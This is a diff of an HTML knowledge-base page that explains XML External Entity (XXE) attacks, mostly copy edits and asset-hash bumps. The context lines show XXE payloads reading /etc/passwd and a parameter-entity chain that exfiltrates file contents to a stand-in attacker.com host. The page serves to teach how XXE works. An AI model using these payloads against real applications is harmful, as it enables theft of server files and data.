@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=8e8f0bd">
+  <link rel="stylesheet" href="/assets/style.css?v=5711bd7">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -321,7 +321,7 @@
       <h1 id="xml-fundamentals">XML Fundamentals</h1>
 <p>Before diving into XXE exploitation it is important to understand the basics of XML and how parsers work. If you are already familiar with XML, DTDs and entity resolution you can skip this section and go straight to the <a href="#xxe-taxonomy">XXE Taxonomy</a>.</p>
 <h2 id="what-is-xml">What is XML</h2>
-<p>XML (eXtensible Markup Language) is a format for storing and transporting structured data. It looks similar to HTML but unlike HTML, XML lets you define your own tags. Here is a simple XML document:</p>
+<p>XML (eXtensible Markup Language) is a format for storing and transporting structured data. It looks similar to HTML, but unlike HTML, XML lets you define your own tags. Here is a simple XML document:</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;user&gt;
   &lt;name&gt;John Doe&lt;/name&gt;
@@ -331,7 +331,7 @@
 <p>The first line (<code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>) is the XML declaration. Everything else is structured data using custom tags. Applications use XML to exchange information between systems, store configuration files, define API requests and much more.</p>
 <h2 id="what-is-an-xml-parser">What is an XML Parser</h2>
 <p>An XML parser is a piece of software that reads XML documents and makes their content available to the application. When a web application receives XML data (for example in an API request), it passes that data to the parser. The parser reads the XML document, checks its syntax and converts it into something the application can work with. For instance, when a Java server receives a POST request with <code>Content-Type: application/xml</code>, it typically passes the body to a parser like <code>DocumentBuilderFactory</code> to extract the data.</p>
-<p>The key thing to understand is that the parser does not just read the data — it also <strong>processes instructions</strong> embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called <strong>entity declarations</strong>, covered in the next sections.</p>
+<p>The key thing to understand is that the parser does not just read the data — it also <strong>processes instructions</strong> embedded in the XML document. This is where the security problem begins, because some of those instructions can tell the parser to read files from the server or make network requests. These instructions are called <strong>entity declarations</strong>, and will be covered in the following sections.</p>
 <h2 id="what-is-a-dtd">What is a DTD</h2>
 <p>A DTD (Document Type Definition) is a set of rules that defines the structure of an XML document. DTDs are declared at the beginning of an XML document using the <code>&lt;!DOCTYPE&gt;</code> declaration. Inside the DTD you can define elements, attributes and <strong>entities</strong>.</p>
 <pre class="highlight"><code class="language-xml">&lt;?xml version="1.0"?&gt;
@@ -372,7 +372,7 @@
 &lt;!ENTITY % step2 "&lt;!ENTITY &amp;#x25; step3 SYSTEM 'http://attacker.com/?data=%step1;'&gt;"&gt;
 %step2;
 %step3;</code></pre>
-<p>What happens here: <code>%step1</code> is an external entity (the <code>SYSTEM</code> keyword makes it fetch the file instead of treating the value as a literal string), <code>%step2</code> creates a new entity that embeds the hostname into a URL, and <code>%step3</code> makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the <code>&amp;#x25;</code> syntax for now, it is explained in detail in the <a href="#understanding-the-escape-characters">OOB section</a>.</p>
+<p>What happens here: <code>%step1</code> is an external entity (the <code>SYSTEM</code> keyword makes it fetch the file instead of treating the value as a literal string), <code>%step2</code> creates a new entity that embeds the hostname into a URL, and <code>%step3</code> makes the parser visit that URL — sending the stolen data to the attacker. Don't worry about the <code>&amp;#x25;</code> syntax for now — it is explained in detail in the <a href="#understanding-the-escape-characters">OOB section</a>.</p>
 <p>This chaining ability is what makes advanced XXE techniques (like blind exfiltration and OOB attacks) possible.</p>
 <h2 id="how-entity-resolution-creates-the-vulnerability">How Entity Resolution Creates the Vulnerability</h2>
 <p>When the parser encounters <code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> followed by <code>&amp;xxe;</code> in the document, it does the following:</p>
@@ -388,7 +388,7 @@
 <h1 id="context-of-xxe">Context of XXE</h1>
 <p>Many legacy and modern applications rely on the XML format to consume, store and manage data from several sources. Nowadays we have other and lighter ways of processing data like JSON, but due to the widespread adoption of XML many products still use it extensively. XML supports custom tags, DTD definitions and schema validation which makes it very flexible but also introduces attack surface through its entity resolution mechanism.</p>
 <h2 id="what-is-it">What is it</h2>
-<p>An XML External Entity attack is a type of attack against an application that parses XML input containing external entity references processed by a weakly configured XML parser. These external entities are defined by the attacker and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specific scenarios, Remote Code Execution (RCE).</p>
+<p>An XML External Entity attack is a type of attack against an application that parses XML input containing external entity references, processed by a weakly configured XML parser. These external entities are defined by the attacker, and they can lead to several side effects like data exfiltration, Server-Side Request Forgery (SSRF), denial of service or even, in very specific scenarios, Remote Code Execution (RCE).</p>
 <p>To understand the difference between a harmless entity and a dangerous one, compare these two examples:</p>
 <p><strong>Internal entity (harmless):</strong></p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" ?&gt;
@@ -397,7 +397,7 @@
   &lt;firstName&gt;John&lt;/firstName&gt;
   &lt;lastName&gt;&amp;example;&lt;/lastName&gt;
  &lt;/userInfo&gt;</code></pre>
-<p>Here the attacker is defining the entity "example", assigning the value "Doe" to it and then reflecting it in the "lastName" element. Nothing leaves the server.</p>
+<p>Here the attacker is defining the entity "example", assigning the value "Doe" to it, and then reflecting it in the "lastName" element. Nothing leaves the server.</p>
 <p><strong>External entity (dangerous):</strong></p>
 <pre class="highlight"><code class="language-XML">&lt;?xml version="1.0" ?&gt;
 &lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM "file:///etc/passwd"&gt; ]&gt;
@@ -407,7 +407,7 @@
  &lt;/userInfo&gt;</code></pre>
 <p>Here the attacker is defining "example" and assigning the content of "/etc/passwd" as the value. In an ideal situation the content of the file will be printed in the response. If the application does not return the content directly, other exfiltration techniques covered later in this KB can be used.</p>
 <h2 id="requirements">Requirements</h2>
-<p>XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. Many XML parsers by default require the developer to limit their capabilities by setting different flags in the component that uses it in order to make them secure. </p>
+<p>XXE attacks require the application to accept XML from uncontrolled sources and parse it in an insecure way. MMany XML parsers are insecure by default and require the developer to explicitly limit their capabilities by setting specific flags in the component that uses it in order to make them secure. </p>
 <hr />
 <h1 id="xxe-taxonomy">XXE Taxonomy</h1>
 <p>The following taxonomy classifies all XXE attack techniques covered in this KB. It serves both as a mental model for understanding how XXE exploitation works and as a navigational index. Techniques are grouped by their primary objective and sorted by difficulty/rarity within each category.</p>
@@ -1969,6 +1969,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=8e8f0bd" defer></script>
+  <script src="/assets/main.js?v=5711bd7" defer></script>
 </body>
 </html>
